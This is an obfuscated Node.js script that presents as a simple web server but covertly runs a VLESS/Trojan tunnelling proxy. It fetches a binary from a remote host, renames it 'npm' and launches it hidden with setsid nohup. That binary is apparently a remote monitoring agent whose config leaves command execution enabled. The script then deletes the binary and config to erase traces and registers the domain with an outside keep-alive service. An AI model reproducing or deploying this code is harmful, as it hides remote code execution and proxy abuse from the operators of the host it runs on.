const _0x2ca4f9=_0x5038;(function(_0x19fd03,_0x514e49){const _0x841780=_0x5038,_0x15b0ff=_0x19fd03();while(!![]){try{const _0x5dacda=parseInt(_0x841780(0x164))/0x1*(parseInt(_0x841780(0x170))/0x2)+parseInt(_0x841780(0x154))/0x3+parseInt(_0x841780(0x1ad))/0x4+-parseInt(_0x841780(0x160))/0x5+-parseInt(_0x841780(0x195))/0x6+parseInt(_0x841780(0x148))/0x7+-parseInt(_0x841780(0x193))/0x8*(parseInt(_0x841780(0x1ab))/0x9);if(_0x5dacda===_0x514e49)break;else _0x15b0ff['push'](_0x15b0ff['shift']());}catch(_0x12a8f9){_0x15b0ff['push'](_0x15b0ff['shift']());}}}(_0x3c65,0xabaae));const os=require('os'),http=require(_0x2ca4f9(0x14b)),fs=require('fs'),axios=require('axios'),net=require(_0x2ca4f9(0x189)),path=require(_0x2ca4f9(0x161)),crypto=require('crypto'),{Buffer}=require(_0x2ca4f9(0x17c)),{exec,execSync}=require(_0x2ca4f9(0x181)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x2ca4f9(0x1ac)]||'32e76569-1dbd-4280-8766-a5f09e603584',NEZHA_SERVER=process[_0x2ca4f9(0x16b)][_0x2ca4f9(0x1bb)]||'',NEZHA_PORT=process[_0x2ca4f9(0x16b)][_0x2ca4f9(0x19e)]||'',NEZHA_KEY=process[_0x2ca4f9(0x16b)][_0x2ca4f9(0x185)]||'',DOMAIN=process[_0x2ca4f9(0x16b)]['DOMAIN']||_0x2ca4f9(0x149),AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![],WSPATH=process[_0x2ca4f9(0x16b)]['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x2ca4f9(0x16b)]['SUB_PATH']||_0x2ca4f9(0x15a),NAME=process[_0x2ca4f9(0x16b)][_0x2ca4f9(0x18a)]||_0x2ca4f9(0x171),PORT=process[_0x2ca4f9(0x16b)][_0x2ca4f9(0x17f)]||0x1eb4;function _0x3c65(){const _0xa3fe90=['2083','includes','message','/bin/bash','asOrganization','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','buffer','slice','text/plain','PORT','url','child_process','443',':443?encryption=none&security=tls&sni=','substr','NEZHA_KEY','utf-8','--tls','2053','net','NAME','\x20-p\x20','unlink','every','Hello\x20world!','writeFileSync','text/html','country','npm\x20download\x20successfully','24OjmyEt','npm','1975848AxXSro','Not\x20Found\x0a','once','update','https://amd64.ssss.nyc.mn/agent','npm\x20is\x20running','close','get','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','NEZHA_PORT','log','end','Unknown','map','length','false','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','true','https://speed.cloudflare.com/meta','send','decode','trim','6358491nuTwlW','UUID','3969916PJnfvL','Answer','application/dns-json','replace','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https://oooo.serv00.net/add-url','readUInt16BE','aarch64','8.8.4.4','join','setsid\x20nohup\x20./npm\x20-s\x20','pop','createWriteStream','application/json','NEZHA_SERVER','arch','listen','digest','split','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','then','arm','9050706MfucMb','1234.abc.com','connect','http','Failed\x20to\x20resolve\x20','toString','hex','2096','chmod\x20+x\x20npm','Status','config.yaml','data','3263928bjvqQX','client_secret:\x20','sha224','concat','arm64','readUInt8','sub','1.1.1.1','writeHead',':443?security=tls&sni=','base64','trojan://','1127825upnsGy','path','pipe','stream','1369tJpvoN','https://','npm\x20running\x20error:','https://arm64.ssss.nyc.mn/v1','test','https://arm64.ssss.nyc.mn/agent','write','env','error','catch','&type=A','https://amd64.ssss.nyc.mn/v1','6ofBwlM','Hug','createServer','post','readFile','&path=%2F'];_0x3c65=function(){return _0xa3fe90;};return _0x3c65();}let ISP='';function _0x5038(_0x45b0d1,_0x257eb9){_0x45b0d1=_0x45b0d1-0x143;const _0x3c6538=_0x3c65();let _0x50389b=_0x3c6538[_0x45b0d1];return _0x50389b;}const GetISP=async()=>{const _0xd8c546=_0x2ca4f9;try{const _0x228ab0=await axios[_0xd8c546(0x19c)](_0xd8c546(0x1a7)),_0x315d12=_0x228ab0[_0xd8c546(0x153)];ISP=(_0x315d12[_0xd8c546(0x191)]+'-'+_0x315d12[_0xd8c546(0x17a)])[_0xd8c546(0x1b0)](/ /g,'_');}catch(_0x537439){ISP=_0xd8c546(0x1a1);}};GetISP();const httpServer=http[_0x2ca4f9(0x172)]((_0x1f78a8,_0x127d3d)=>{const _0x4c3cff=_0x2ca4f9;if(_0x1f78a8[_0x4c3cff(0x180)]==='/'){const _0x5b6101=path[_0x4c3cff(0x1b6)](__dirname,'index.html');fs[_0x4c3cff(0x174)](_0x5b6101,'utf8',(_0x2e1dc3,_0x41e7a0)=>{const _0x437028=_0x4c3cff;if(_0x2e1dc3){_0x127d3d[_0x437028(0x15c)](0xc8,{'Content-Type':_0x437028(0x190)}),_0x127d3d[_0x437028(0x1a0)](_0x437028(0x18e));return;}_0x127d3d[_0x437028(0x15c)](0xc8,{'Content-Type':_0x437028(0x190)}),_0x127d3d['end'](_0x41e7a0);});return;}else{if(_0x1f78a8[_0x4c3cff(0x180)]==='/'+SUB_PATH){const _0x43de='vless://'+UUID+'@'+DOMAIN+_0x4c3cff(0x183)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x4c3cff(0x175)+WSPATH+'#'+NAME+'-'+ISP,_0x588795=_0x4c3cff(0x15f)+UUID+'@'+DOMAIN+_0x4c3cff(0x15d)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x4c3cff(0x175)+WSPATH+'#'+NAME+'-'+ISP,_0x1ac9d9=_0x43de+'\x0a'+_0x588795,_0x180a96=Buffer['from'](_0x1ac9d9)[_0x4c3cff(0x14d)](_0x4c3cff(0x15e));_0x127d3d[_0x4c3cff(0x15c)](0xc8,{'Content-Type':_0x4c3cff(0x17e)}),_0x127d3d[_0x4c3cff(0x1a0)](_0x180a96+'\x0a');}else _0x127d3d[_0x4c3cff(0x15c)](0x194,{'Content-Type':_0x4c3cff(0x17e)}),_0x127d3d[_0x4c3cff(0x1a0)](_0x4c3cff(0x196));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x2ca4f9(0x1b0)](/-/g,''),DNS_SERVERS=[_0x2ca4f9(0x1b5),_0x2ca4f9(0x15b)];function resolveHost(_0x48a731){return new Promise((_0x24242c,_0x3264c4)=>{const _0x49f404=_0x5038;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x49f404(0x168)](_0x48a731)){_0x24242c(_0x48a731);return;}let _0x2bd05e=0x0;function _0x42f57f(){const _0x25e3e1=_0x49f404;if(_0x2bd05e>=DNS_SERVERS[_0x25e3e1(0x1a3)]){_0x3264c4(new Error(_0x25e3e1(0x14c)+_0x48a731+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x124479=DNS_SERVERS[_0x2bd05e];_0x2bd05e++;const _0x4685a0='https://dns.google/resolve?name='+encodeURIComponent(_0x48a731)+_0x25e3e1(0x16e);axios[_0x25e3e1(0x19c)](_0x4685a0,{'timeout':0x1388,'headers':{'Accept':_0x25e3e1(0x1af)}})[_0x25e3e1(0x146)](_0x1ac3f0=>{const _0x118c2f=_0x25e3e1,_0x26155b=_0x1ac3f0[_0x118c2f(0x153)];if(_0x26155b[_0x118c2f(0x151)]===0x0&&_0x26155b['Answer']&&_0x26155b[_0x118c2f(0x1ae)]['length']>0x0){const _0x251768=_0x26155b[_0x118c2f(0x1ae)]['find'](_0x22747d=>_0x22747d['type']===0x1);if(_0x251768){_0x24242c(_0x251768[_0x118c2f(0x153)]);return;}}_0x42f57f();})[_0x25e3e1(0x16d)](_0x12c590=>{_0x42f57f();});}_0x42f57f();});}function handleVlessConnection(_0x127b4c,_0x5f477d){const _0x4c9070=_0x2ca4f9,[_0x2d8ba8]=_0x5f477d,_0xe64205=_0x5f477d[_0x4c9070(0x17d)](0x1,0x11);if(!_0xe64205['every']((_0x23ef97,_0x183f61)=>_0x23ef97==parseInt(uuid[_0x4c9070(0x184)](_0x183f61*0x2,0x2),0x10)))return![];let _0x58419b=_0x5f477d[_0x4c9070(0x17d)](0x11,0x12)[_0x4c9070(0x159)]()+0x13;const _0x538c56=_0x5f477d['slice'](_0x58419b,_0x58419b+=0x2)['readUInt16BE'](0x0),_0x290646=_0x5f477d['slice'](_0x58419b,_0x58419b+=0x1)[_0x4c9070(0x159)](),_0x345b7d=_0x290646==0x1?_0x5f477d['slice'](_0x58419b,_0x58419b+=0x4)[_0x4c9070(0x1b6)]('.'):_0x290646==0x2?new TextDecoder()[_0x4c9070(0x1a9)](_0x5f477d['slice'](_0x58419b+0x1,_0x58419b+=0x1+_0x5f477d[_0x4c9070(0x17d)](_0x58419b,_0x58419b+0x1)[_0x4c9070(0x159)]())):_0x290646==0x3?_0x5f477d[_0x4c9070(0x17d)](_0x58419b,_0x58419b+=0x10)['reduce']((_0x549e94,_0x3ae59f,_0x3aa1a1,_0x352b66)=>_0x3aa1a1%0x2?_0x549e94[_0x4c9070(0x157)](_0x352b66[_0x4c9070(0x17d)](_0x3aa1a1-0x1,_0x3aa1a1+0x1)):_0x549e94,[])[_0x4c9070(0x1a2)](_0x3edd17=>_0x3edd17[_0x4c9070(0x1b3)](0x0)[_0x4c9070(0x14d)](0x10))[_0x4c9070(0x1b6)](':'):'';_0x127b4c[_0x4c9070(0x1a8)](new Uint8Array([_0x2d8ba8,0x0]));const _0x2fd1ea=createWebSocketStream(_0x127b4c);return resolveHost(_0x345b7d)[_0x4c9070(0x146)](_0x3a8d01=>{const _0x5f45fb=_0x4c9070;net[_0x5f45fb(0x14a)]({'host':_0x3a8d01,'port':_0x538c56},function(){const _0x46619a=_0x5f45fb;this[_0x46619a(0x16a)](_0x5f477d['slice'](_0x58419b)),_0x2fd1ea['on']('error',()=>{})[_0x46619a(0x162)](this)['on']('error',()=>{})[_0x46619a(0x162)](_0x2fd1ea);})['on'](_0x5f45fb(0x16c),()=>{});})[_0x4c9070(0x16d)](_0x15bfb3=>{net['connect']({'host':_0x345b7d,'port':_0x538c56},function(){const _0x54a858=_0x5038;this[_0x54a858(0x16a)](_0x5f477d[_0x54a858(0x17d)](_0x58419b)),_0x2fd1ea['on']('error',()=>{})['pipe'](this)['on'](_0x54a858(0x16c),()=>{})[_0x54a858(0x162)](_0x2fd1ea);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x42fb7a,_0x26296e){const _0x4aeb15=_0x2ca4f9;try{if(_0x26296e[_0x4aeb15(0x1a3)]<0x3a)return![];const _0x22ee9a=_0x26296e[_0x4aeb15(0x17d)](0x0,0x38)['toString'](),_0x503a9b=[UUID];let _0x35f145=null;for(const _0x5c3954 of _0x503a9b){const _0x93890a=crypto['createHash'](_0x4aeb15(0x156))[_0x4aeb15(0x198)](_0x5c3954)[_0x4aeb15(0x143)](_0x4aeb15(0x14e));if(_0x93890a===_0x22ee9a){_0x35f145=_0x5c3954;break;}}if(!_0x35f145)return![];let _0x265152=0x38;_0x26296e[_0x265152]===0xd&&_0x26296e[_0x265152+0x1]===0xa&&(_0x265152+=0x2);const _0x3a2d28=_0x26296e[_0x265152];if(_0x3a2d28!==0x1)return![];_0x265152+=0x1;const _0x599846=_0x26296e[_0x265152];_0x265152+=0x1;let _0xfca9c,_0x3100df;if(_0x599846===0x1)_0xfca9c=_0x26296e[_0x4aeb15(0x17d)](_0x265152,_0x265152+0x4)[_0x4aeb15(0x1b6)]('.'),_0x265152+=0x4;else{if(_0x599846===0x3){const _0x561792=_0x26296e[_0x265152];_0x265152+=0x1,_0xfca9c=_0x26296e[_0x4aeb15(0x17d)](_0x265152,_0x265152+_0x561792)[_0x4aeb15(0x14d)](),_0x265152+=_0x561792;}else{if(_0x599846===0x4)_0xfca9c=_0x26296e[_0x4aeb15(0x17d)](_0x265152,_0x265152+0x10)['reduce']((_0x5258cf,_0x9d24cd,_0x1df9de,_0x3fc46d)=>_0x1df9de%0x2?_0x5258cf[_0x4aeb15(0x157)](_0x3fc46d[_0x4aeb15(0x17d)](_0x1df9de-0x1,_0x1df9de+0x1)):_0x5258cf,[])[_0x4aeb15(0x1a2)](_0x27b012=>_0x27b012[_0x4aeb15(0x1b3)](0x0)['toString'](0x10))['join'](':'),_0x265152+=0x10;else return![];}}_0x3100df=_0x26296e['readUInt16BE'](_0x265152),_0x265152+=0x2;_0x265152<_0x26296e[_0x4aeb15(0x1a3)]&&_0x26296e[_0x265152]===0xd&&_0x26296e[_0x265152+0x1]===0xa&&(_0x265152+=0x2);const _0x41035f=createWebSocketStream(_0x42fb7a);return resolveHost(_0xfca9c)['then'](_0x53abda=>{net['connect']({'host':_0x53abda,'port':_0x3100df},function(){const _0x454da6=_0x5038;_0x265152<_0x26296e[_0x454da6(0x1a3)]&&this[_0x454da6(0x16a)](_0x26296e[_0x454da6(0x17d)](_0x265152)),_0x41035f['on'](_0x454da6(0x16c),()=>{})['pipe'](this)['on'](_0x454da6(0x16c),()=>{})[_0x454da6(0x162)](_0x41035f);})['on']('error',()=>{});})[_0x4aeb15(0x16d)](_0x17cb32=>{const _0x56d02e=_0x4aeb15;net[_0x56d02e(0x14a)]({'host':_0xfca9c,'port':_0x3100df},function(){const _0x2d83eb=_0x56d02e;_0x265152<_0x26296e[_0x2d83eb(0x1a3)]&&this[_0x2d83eb(0x16a)](_0x26296e[_0x2d83eb(0x17d)](_0x265152)),_0x41035f['on'](_0x2d83eb(0x16c),()=>{})[_0x2d83eb(0x162)](this)['on'](_0x2d83eb(0x16c),()=>{})[_0x2d83eb(0x162)](_0x41035f);})['on']('error',()=>{});}),!![];}catch(_0x5d1bdd){return![];}}wss['on']('connection',(_0xa2f339,_0x39a31d)=>{const _0x9dc6e9=_0x2ca4f9,_0x214cbe=_0x39a31d[_0x9dc6e9(0x180)]||'';_0xa2f339[_0x9dc6e9(0x197)](_0x9dc6e9(0x178),_0x55aa3d=>{const _0x49cb21=_0x9dc6e9;if(_0x55aa3d[_0x49cb21(0x1a3)]>0x11&&_0x55aa3d[0x0]===0x0){const _0x5b54f7=_0x55aa3d['slice'](0x1,0x11),_0x1300f7=_0x5b54f7[_0x49cb21(0x18d)]((_0x1bc88d,_0x5eecf9)=>_0x1bc88d==parseInt(uuid[_0x49cb21(0x184)](_0x5eecf9*0x2,0x2),0x10));if(_0x1300f7){!handleVlessConnection(_0xa2f339,_0x55aa3d)&&_0xa2f339['close']();return;}}!handleTrojanConnection(_0xa2f339,_0x55aa3d)&&_0xa2f339[_0x49cb21(0x19b)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x479d8f=_0x2ca4f9,_0x12766d=os[_0x479d8f(0x1bc)]();return _0x12766d===_0x479d8f(0x147)||_0x12766d===_0x479d8f(0x158)||_0x12766d===_0x479d8f(0x1b4)?!NEZHA_PORT?_0x479d8f(0x167):_0x479d8f(0x169):!NEZHA_PORT?_0x479d8f(0x16f):_0x479d8f(0x199);},downloadFile=async()=>{const _0x2c170a=_0x2ca4f9;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1cb400=getDownloadUrl(),_0x34f1a6=await axios({'method':_0x2c170a(0x19c),'url':_0x1cb400,'responseType':_0x2c170a(0x163)}),_0x4f45a7=fs[_0x2c170a(0x1b9)](_0x2c170a(0x194));return _0x34f1a6[_0x2c170a(0x153)][_0x2c170a(0x162)](_0x4f45a7),new Promise((_0x113757,_0x421ba1)=>{const _0x3cf83a=_0x2c170a;_0x4f45a7['on']('finish',()=>{const _0x102373=_0x5038;console[_0x102373(0x19f)](_0x102373(0x192)),exec(_0x102373(0x150),_0x3430bf=>{if(_0x3430bf)_0x421ba1(_0x3430bf);_0x113757();});}),_0x4f45a7['on'](_0x3cf83a(0x16c),_0x421ba1);});}catch(_0x4aea80){throw _0x4aea80;}},runnz=async()=>{const _0x9d266d=_0x2ca4f9;try{const _0xf5b620=execSync(_0x9d266d(0x145),{'encoding':_0x9d266d(0x186)});if(_0xf5b620[_0x9d266d(0x1aa)]()!==''){console[_0x9d266d(0x19f)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x4f47b7){}await downloadFile();let _0x27891a='',_0x371e3e=[_0x9d266d(0x182),'8443',_0x9d266d(0x14f),'2087',_0x9d266d(0x176),_0x9d266d(0x188)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1e2f65=_0x371e3e['includes'](NEZHA_PORT)?_0x9d266d(0x187):'';_0x27891a=_0x9d266d(0x1b7)+NEZHA_SERVER+':'+NEZHA_PORT+_0x9d266d(0x18b)+NEZHA_KEY+'\x20'+_0x1e2f65+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1021c0=NEZHA_SERVER[_0x9d266d(0x177)](':')?NEZHA_SERVER[_0x9d266d(0x144)](':')[_0x9d266d(0x1b8)]():'',_0x2a333b=_0x371e3e[_0x9d266d(0x177)](_0x1021c0)?_0x9d266d(0x1a6):_0x9d266d(0x1a4),_0x4473c5=_0x9d266d(0x155)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x9d266d(0x19d)+_0x2a333b+_0x9d266d(0x1b1)+UUID;fs[_0x9d266d(0x18f)]('config.yaml',_0x4473c5);}_0x27891a=_0x9d266d(0x17b);}else{console[_0x9d266d(0x19f)](_0x9d266d(0x1a5));return;}}try{exec(_0x27891a,{'shell':_0x9d266d(0x179)},_0x5cd1b1=>{const _0x40cb82=_0x9d266d;if(_0x5cd1b1)console[_0x40cb82(0x16c)](_0x40cb82(0x166),_0x5cd1b1);else console[_0x40cb82(0x19f)](_0x40cb82(0x19a));});}catch(_0x4a0c09){console[_0x9d266d(0x16c)]('error:\x20'+_0x4a0c09);}};async function addAccessTask(){const _0x44d9d0=_0x2ca4f9;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x13a045=_0x44d9d0(0x165)+DOMAIN;try{const _0x405fce=await axios[_0x44d9d0(0x173)](_0x44d9d0(0x1b2),{'url':_0x13a045},{'headers':{'Content-Type':_0x44d9d0(0x1ba)}});console[_0x44d9d0(0x19f)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x4fa876){}}const delFiles=()=>{const _0x396f45=_0x2ca4f9;fs['unlink'](_0x396f45(0x194),()=>{}),fs[_0x396f45(0x18c)](_0x396f45(0x152),()=>{});};httpServer[_0x2ca4f9(0x1bd)](PORT,()=>{const _0x1c5a62=_0x2ca4f9;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x1c5a62(0x19f)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
